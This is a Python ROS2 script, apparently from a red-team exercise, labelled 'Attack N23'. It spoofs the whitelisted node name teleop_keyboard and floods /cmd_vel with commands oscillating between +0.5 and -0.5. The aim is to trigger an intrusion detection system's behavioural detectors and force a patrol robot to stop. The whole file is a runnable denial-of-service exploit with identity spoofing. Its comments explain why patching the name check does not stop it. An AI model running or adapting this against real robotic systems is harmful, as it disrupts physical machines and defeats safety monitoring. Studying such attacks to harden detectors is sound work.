#!/usr/bin/env python3
"""攻擊 N23 — 用「白名單合法名字」純靠行為偵測器觸發 IDS → DoS.

N21 用「未授權名字」觸發 D4。本攻擊證明：就算藍方修好 D4 名字檢查，
攻擊者改用**白名單上的合法名字**（teleop_keyboard），純靠 D1+D2 行為偵測器
一樣能誘使 IDS 簽警報 → patrol 停車。

→ 證明 N21 是「偵測器 cascade 成 emergency stop」這個結構問題，
   不是任何單一 detector（D4）的洞。修 D4 補不了。

觸發方式（不踩 D4）：
    node 名 = teleop_keyboard（在 CMD_ALLOWED 白名單 → D4 名字檢查放行；
              且只有我一個 cmd_vel publisher → D4 計數=1 不觸發）
    cmd_vel 高頻在 +0.5 / -0.5 之間振盪：
        D1 physics: |lin|=0.5 > 0.23  → 觸發
        D2 oscillation: 前進/後退共存 → 觸發
    兩票 → IDS 簽 CH_ALERTS 警報 → patrol 停車。
"""
import sys
import time
import rclpy
from rclpy.node import Node
from geometry_msgs.msg import TwistStamped


class BehavioralTrigger(Node):

    def __init__(self):
        # 白名單合法名字 → D4 名字檢查放行
        super().__init__('teleop_keyboard')
        self._pub = self.create_publisher(TwistStamped, '/cmd_vel', 10)
        self._k = 0
        # 20Hz 高頻振盪，快速塞滿 IDS 的 cmd_history 製造方向衝突
        self.create_timer(0.05, self._osc)
        self.get_logger().error(
            '☠️ N23: 用白名單名 teleop_keyboard 振盪 cmd_vel '
            '→ 觸發 D1(物理)+D2(方向衝突) → IDS 簽警報 → patrol 停車'
        )

    def _osc(self):
        self._k += 1
        m = TwistStamped()
        m.header.stamp = self.get_clock().now().to_msg()
        m.header.frame_id = 'base_link'
        # 在 +0.5 / -0.5 振盪：同時踩 D1(>0.23) 跟 D2(前後共存)
        m.twist.linear.x = 0.5 if (self._k % 2 == 0) else -0.5
        self._pub.publish(m)


def main():
    rclpy.init()
    node = BehavioralTrigger()
    duration = float(sys.argv[1]) if len(sys.argv) > 1 else 40.0
    deadline = time.monotonic() + duration
    try:
        while rclpy.ok() and time.monotonic() < deadline:
            rclpy.spin_once(node, timeout_sec=0.1)
    finally:
        node.get_logger().error('⏹ 結束')
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
